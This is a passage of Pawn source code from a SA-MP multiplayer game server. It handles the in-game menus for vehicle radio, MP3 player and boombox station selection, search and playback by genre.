    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Rap", stringg, "Play", "Cancel");
			}
			if(listitem == 19)
			{
				for(new r = 190; r < 200; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Reggae", stringg, "Play", "Cancel");
			}
			if(listitem == 20)
			{
				for(new r = 200; r < 210; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Rock", stringg, "Play", "Cancel");
			}
			if(listitem == 21)
			{
				for(new r = 210; r < 220; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_PLAY, DIALOG_STYLE_LIST, "Radio stations - Talk", stringg, "Play", "Cancel");
			}
			// CURRENTLY NO HOLIDAYS
			/*if(listitem == 24)
			{
                ShowPlayerDialogEx(playerid, DIALOG_RADIOMENU_SEASON, DIALOG_STYLE_LIST, "Radio stations - Seasonal/Holiday", "", "Play", "Cancel");
			}*/
		}
	}
	else if(dialogid == DIALOG_RADIOMENU_PLAY)
	{
		if(response)
		{
		    new t = ListItemTrackId[playerid][listitem];
			new radiovehicle = GetPlayerVehicleID(playerid);

			if(VehicleRadioStation[radiovehicle] == t+1)
			{
   				SendClientMessage(playerid, COLOR_GRAD1, "The radio station in this vehicle is already set to that station.");
				return 1;
			}

			format(string, sizeof(string), "* %s has set the radio station to %s.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			VehicleRadioStation[radiovehicle] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);

			foreach(Player, i)
			{
  				if(GetPlayerVehicleID(i) == radiovehicle && IsPlayerInAnyVehicle(i) && GetPlayerState(i) == PLAYER_STATE_PASSENGER && i != playerid)
	    		{
      				PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl]);
		    	}
			}
		}
	}
	if(dialogid == DIALOG_MP3_START)
	{
		if(response)
		{
			if(listitem == 0)
			{
  				if(MP3Station[playerid] == 0)
  				{
  				    SendClientMessage(playerid, COLOR_GRAD1, "Your MP3 Player is already turned off.");
					return 1;
  				}

				format(string, sizeof(string), "* %s has turned off their MP3 Player.", GetPlayerNameEx(playerid));
				ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			    MP3Station[playerid] = 0;
       			StopAudioStreamForPlayer(playerid);
			}
			if(listitem == 1)
			{
				ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCH, DIALOG_STYLE_INPUT, "MP3 Player - Search radio", "Enter the radio station you want to search for.\n\nNote: The search must be no less than 3 characters in length.", "Search", "Cancel");
			}
			if(listitem == 2)
			{
				ShowPlayerDialogEx(playerid, DIALOG_MP3_GENRE, DIALOG_STYLE_LIST, "MP3 Player - Select a genre", "Alternative\nBlues\nClassical\nCountry\nDecades\nEasy Listening\nElectronic\nFolk\nInspirational\nInternational\nJazz\nLatin\nMetal\nMisc\nNew Age\nPop\nPublic Radio\nR&B/Urban\nRap\nReggae\nRock\nTalk", "Select", "Cancel");
			}
		}
	}
	if(dialogid == DIALOG_MP3_SEARCH)
	{
		if(response)
		{
 			if(strlen(inputtext) < 3)
	    	{
	        	ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCH, DIALOG_STYLE_INPUT, "MP3 Player - Search radio", "ENTRY DECLINED: The search must be no less than 3 characters in length.\n\nEnter the radio station you want to search for.\n\nNote: It must be no less than 3 characters.", "Search", "Cancel");
	    	}
	    	else
	    	{
	    	    for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

    			new stringg[512], name[32], search[128], iCount;

    			strcat(search, inputtext, sizeof(search));

				for (new i=0; i<220; i++)
				{
					if(strfind(VehicleRadioListing[i][radioname], search, true) != -1 && iCount < 50)
					{
            			format(name, sizeof(name), "%s", VehicleRadioListing[i][radioname]);
						format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(iCount == 0)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCH, DIALOG_STYLE_INPUT, "MP3 Player - Search radio", "SEARCH FAILED: No such radio stations found.\n\nEnter the radio station you want to search for.\n\nNote: It must be no less than 3 characters.", "Search", "Cancel");
				}
				else
				{
					ShowPlayerDialogEx(playerid, DIALOG_MP3_SEARCHLIST, DIALOG_STYLE_LIST, "MP3 Player - Search results", stringg, "Play", "Cancel");
				}
			}
	    }
 	}
	if(dialogid == DIALOG_MP3_SEARCHLIST)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s has set their MP3 Player to %s.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			MP3Station[playerid] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);
		}
	}
	if(dialogid == DIALOG_MP3_GENRE)
	{
		if(response)
		{
			new stringg[321], name[32], iCount;

			for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

			if(listitem == 0)
			{
			    for(new r = 0; r < 10; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Alternative", stringg, "Play", "Cancel");
			}
			if(listitem == 1)
			{
   				for(new r = 10; r < 20; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Blues", stringg, "Play", "Cancel");
			}
			if(listitem == 2)
			{
   				for(new r = 20; r < 30; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Classical", stringg, "Play", "Cancel");
			}
			if(listitem == 3)
			{
   				for(new r = 30; r < 40; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Country", stringg, "Play", "Cancel");
			}
			if(listitem == 4)
			{
   				for(new r = 40; r < 50; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Decades", stringg, "Play", "Cancel");
			}
			if(listitem == 5)
			{
   				for(new r = 50; r < 60; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Easy Listening", stringg, "Play", "Cancel");
			}
			if(listitem == 6)
			{
   				for(new r = 60; r < 70; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Electronic", stringg, "Play", "Cancel");
			}
			if(listitem == 7)
			{
   				for(new r = 70; r < 80; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Folk", stringg, "Play", "Cancel");
			}
			if(listitem == 8)
			{
   				for(new r = 80; r < 90; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Inspirational", stringg, "Play", "Cancel");
			}
			if(listitem == 9)
			{
   				for(new r = 90; r < 100; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - International", stringg, "Play", "Cancel");
			}
			if(listitem == 10)
			{
   				for(new r = 100; r < 110; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Jazz", stringg, "Play", "Cancel");
			}
			if(listitem == 11)
			{
				for(new r = 110; r < 120; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Latin", stringg, "Play", "Cancel");
			}
			if(listitem == 12)
			{
				for(new r = 120; r < 130; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Metal", stringg, "Play", "Cancel");
			}
			if(listitem == 13)
			{
				for(new r = 130; r < 140; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Misc", stringg, "Play", "Cancel");
			}
			if(listitem == 14)
			{
				for(new r = 140; r < 150; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - New Age", stringg, "Play", "Cancel");
			}
			if(listitem == 15)
			{
				for(new r = 150; r < 160; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Pop", stringg, "Play", "Cancel");
			}
			if(listitem == 16)
			{
				for(new r = 160; r < 170; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Public Radio", stringg, "Play", "Cancel");
			}
			if(listitem == 17)
			{
				for(new r = 170; r < 180; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - R&B/Urban", stringg, "Play", "Cancel");
			}
			if(listitem == 18)
			{
				for(new r = 180; r < 190; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Rap", stringg, "Play", "Cancel");
			}
			if(listitem == 19)
			{
				for(new r = 190; r < 200; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Reggae", stringg, "Play", "Cancel");
			}
			if(listitem == 20)
			{
				for(new r = 200; r < 210; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Rock", stringg, "Play", "Cancel");
			}
			if(listitem == 21)
			{
				for(new r = 210; r < 220; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_MP3_PLAY, DIALOG_STYLE_LIST, "MP3 Player - Talk", stringg, "Play", "Cancel");
			}
			// CURRENTLY NO HOLIDAYS
			/*if(listitem == 24)
			{
                ShowPlayerDialogEx(playerid, DIALOG_MP3_SEASON, DIALOG_STYLE_LIST, "MP3 Player - Seasonal/Holiday", "", "Play", "Cancel");
			}*/
		}
	}
	else if(dialogid == DIALOG_MP3_PLAY)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s has set their MP3 Player to %s.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			MP3Station[playerid] = t+1;
  			PlayAudioStreamForPlayer(playerid, VehicleRadioListing[t][radiourl]);
		}
	}
	if(dialogid == DIALOG_BOOMBOX_START)
	{
		if(response)
		{
			if(listitem == 0)
			{
				ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCH, DIALOG_STYLE_INPUT, "Boombox - Search radio", "Enter the radio station you want to search for.\n\nNote: The search must be no less than 3 characters in length.", "Search", "Cancel");
			}
			if(listitem == 1)
			{
				ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_GENRE, DIALOG_STYLE_LIST, "Boombox - Select a genre", "Alternative\nBlues\nClassical\nCountry\nDecades\nEasy Listening\nElectronic\nFolk\nInspirational\nInternational\nJazz\nLatin\nMetal\nMisc\nNew Age\nPop\nPublic Radio\nR&B/Urban\nRap\nReggae\nRock\nTalk", "Select", "Cancel");
			}
		}
	}
	if(dialogid == DIALOG_BOOMBOX_SEARCH)
	{
		if(response)
		{
 			if(strlen(inputtext) < 3)
	    	{
	        	ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCH, DIALOG_STYLE_INPUT, "Boombox - Search radio", "ENTRY DECLINED: The search must be no less than 3 characters in length.\n\nEnter the radio station you want to search for.\n\nNote: It must be no less than 3 characters.", "Search", "Cancel");
	    	}
	    	else
	    	{
	    	    for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

    			new stringg[512], name[32], search[128], iCount;

    			strcat(search, inputtext, sizeof(search));

				for (new i=0; i<220; i++)
				{
					if(strfind(VehicleRadioListing[i][radioname], search, true) != -1 && iCount < 50)
					{
            			format(name, sizeof(name), "%s", VehicleRadioListing[i][radioname]);
						format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
						ListItemTrackId[playerid][iCount++] = i;
					}
				}
				if(iCount == 0)
				{
				    ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCH, DIALOG_STYLE_INPUT, "Boombox - Search radio", "SEARCH FAILED: No such radio stations found.\n\nEnter the radio station you want to search for.\n\nNote: It must be no less than 3 characters.", "Search", "Cancel");
				}
				else
				{
					ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEARCHLIST, DIALOG_STYLE_LIST, "Boombox - Search results", stringg, "Play", "Cancel");
				}
			}
	    }
 	}
	if(dialogid == DIALOG_BOOMBOX_SEARCHLIST)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s has set down a Boombox to %s.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			BoomBoxSet[playerid] = 1;

        	GetPlayerPos(playerid, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]);
        	BoomboxInfo[playerid][bbInt] = GetPlayerInterior(playerid);
        	BoomboxInfo[playerid][bbVW] = GetPlayerVirtualWorld(playerid);
			BoomboxInfo[playerid][bbStation] = t+1;
			BoomboxInfo[playerid][bbSetBy] = playerid;

			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			BoomboxInfo[playerid][bbObject] = CreateDynamicObject(2103, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]-0.9, 0, 0, 0, BoomboxInfo[playerid][bbVW], BoomboxInfo[playerid][bbInt]);

       		foreach(Player, i)
			{
				if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[playerid][bbPosX],BoomboxInfo[playerid][bbPosY],BoomboxInfo[playerid][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[playerid][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[playerid][bbVW])
				{
					PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl], BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ], 50.0, 1);
				}
			}
		}
	}
	if(dialogid == DIALOG_BOOMBOX_GENRE)
	{
		if(response)
		{
			new stringg[321], name[32], iCount;

			for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;

			if(listitem == 0)
			{
			    for(new r = 0; r < 10; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Alternative", stringg, "Play", "Cancel");
			}
			if(listitem == 1)
			{
   				for(new r = 10; r < 20; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Blues", stringg, "Play", "Cancel");
			}
			if(listitem == 2)
			{
   				for(new r = 20; r < 30; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Classical", stringg, "Play", "Cancel");
			}
			if(listitem == 3)
			{
   				for(new r = 30; r < 40; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Country", stringg, "Play", "Cancel");
			}
			if(listitem == 4)
			{
   				for(new r = 40; r < 50; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Decades", stringg, "Play", "Cancel");
			}
			if(listitem == 5)
			{
   				for(new r = 50; r < 60; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Easy Listening", stringg, "Play", "Cancel");
			}
			if(listitem == 6)
			{
   				for(new r = 60; r < 70; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Electronic", stringg, "Play", "Cancel");
			}
			if(listitem == 7)
			{
   				for(new r = 70; r < 80; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Folk", stringg, "Play", "Cancel");
			}
			if(listitem == 8)
			{
   				for(new r = 80; r < 90; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Inspirational", stringg, "Play", "Cancel");
			}
			if(listitem == 9)
			{
   				for(new r = 90; r < 100; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox International", stringg, "Play", "Cancel");
			}
			if(listitem == 10)
			{
   				for(new r = 100; r < 110; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Jazz", stringg, "Play", "Cancel");
			}
			if(listitem == 11)
			{
				for(new r = 110; r < 120; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Latin", stringg, "Play", "Cancel");
			}
			if(listitem == 12)
			{
				for(new r = 120; r < 130; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Metal", stringg, "Play", "Cancel");
			}
			if(listitem == 13)
			{
				for(new r = 130; r < 140; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Misc", stringg, "Play", "Cancel");
			}
			if(listitem == 14)
			{
				for(new r = 140; r < 150; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox New Age", stringg, "Play", "Cancel");
			}
			if(listitem == 15)
			{
				for(new r = 150; r < 160; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Pop", stringg, "Play", "Cancel");
			}
			if(listitem == 16)
			{
				for(new r = 160; r < 170; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Public Radio", stringg, "Play", "Cancel");
			}
			if(listitem == 17)
			{
				for(new r = 170; r < 180; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox R&B/Urban", stringg, "Play", "Cancel");
			}
			if(listitem == 18)
			{
				for(new r = 180; r < 190; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Rap", stringg, "Play", "Cancel");
			}
			if(listitem == 19)
			{
				for(new r = 190; r < 200; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Reggae", stringg, "Play", "Cancel");
			}
			if(listitem == 20)
			{
				for(new r = 200; r < 210; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Rock", stringg, "Play", "Cancel");
			}
			if(listitem == 21)
			{
				for(new r = 210; r < 220; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Talk", stringg, "Play", "Cancel");
			}
			// CURRENTLY NO HOLIDAYS
			/*if(listitem == 24)
			{
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEASON, DIALOG_STYLE_LIST, "Boombox Seasonal/Holiday", "", "Play", "Cancel");
			}*/
		}
	}
